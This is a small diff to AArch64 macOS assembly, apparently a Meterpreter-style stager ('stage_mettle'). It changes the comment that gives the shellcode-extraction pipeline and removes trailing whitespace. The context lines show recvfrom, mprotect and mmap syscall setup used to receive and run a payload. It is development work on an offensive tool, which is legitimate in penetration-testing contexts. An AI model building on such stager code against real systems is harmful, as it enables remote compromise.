@@ -1,5 +1,5 @@
 // Compile: clang stage_mettle.s
-// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5 | grep -Ev ':|o|^$' | rev | awk '{print "0x"$1$2$3$4","}'
+// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5 | cut -d ' ' -f 2- | ruby tools/payloads/format_aarch64.rb
 .equ SYS_RECVFROM, 0x200001d
 .equ SYS_MPROTECT, 0x200004a
 .equ SYS_MMAP, 0x20000c5
@@ -72,7 +72,7 @@ _main:
     ldr x10, [x10]
     mov x12, x11
     mov x15, x0
-    
+
     /* make stack space */
     /* mmap(addr=0, length=0x40000, prot=3 (PROT_READ | PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
     mov x0, xzr
